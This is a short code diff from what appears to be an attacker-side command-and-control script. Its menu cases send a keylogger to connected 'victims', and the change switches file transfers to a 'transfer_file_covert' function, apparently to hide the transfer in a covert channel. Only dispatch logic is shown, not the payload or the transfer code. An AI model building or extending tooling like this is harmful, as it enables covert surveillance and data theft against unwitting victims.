@@ -83,7 +83,8 @@ if __name__ == '__main__':
                             break
                             # return None
                         else:
-                            transfer_file(client_socket, client_ip, client_port)
+                            # choices = protocol_and_field_selector()
+                            transfer_file_covert(client_socket, client_ip, client_port)
 
                     # CASE 3: Send keylogger to any specific connected victim
                     elif len(connected_clients) != constants.ZERO:
@@ -106,7 +107,7 @@ if __name__ == '__main__':
                             pass
                             # return None
                         elif target_socket:
-                            transfer_file(target_socket, target_ip, target_port)
+                            transfer_file_covert(target_socket, target_ip, target_port)
                         else:
                             print(constants.TARGET_VICTIM_NOT_FOUND)
                             print(constants.RETURN_MAIN_MENU_MSG)
